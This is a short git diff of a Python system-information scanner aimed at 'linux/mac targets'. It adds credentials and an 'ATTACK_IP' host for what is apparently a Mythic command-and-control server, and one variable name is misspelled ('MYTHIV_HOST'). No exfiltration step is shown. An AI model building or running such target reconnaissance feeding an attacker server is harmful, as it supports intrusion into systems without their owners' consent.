@@ -1,7 +1,7 @@
 '''
  # @ Create Time: 2024-09-04 11:10:07
  # @ Modified time: 2024-09-04 11:35:24
- # @ Description: define two classes to achieve two different scanning methods
+ # @ Description: class to collect system information from linux/mac targets
  '''
 import platform
 import socket
@@ -19,9 +19,14 @@ from pathlib import Path
 import tempfile
 import json
 import asyncio
+from dotenv import load_dotenv
+
+# load .env for sensitive tokens
+load_dotenv()
 
 class SysInfoScanner:
     def __init__(self, save_location: Path):
+        
         self.save_location = save_location
         
 
@@ -180,6 +185,12 @@ class SysInfoScanner:
         self._compress(encoded_info, self.save_location)
 
 async def run():
+
+    os.environ['MYTHIC_USERNAME'] = os.getenv("ADMINUSER")
+    os.environ["MYTHIC_PASSWORD"] = os.getenv("PASSWORD")
+    os.environ["MYTHIV_HOST"] = os.getenv("ATTACK_IP")
+    os.environ["MYTHIC_VHOST"] = os.getenv("MYTHIC_VHOST")
+
     temp_path = tempfile.gettempdir()
     sysscanner = SysInfoScanner(temp_path)
     # define the file
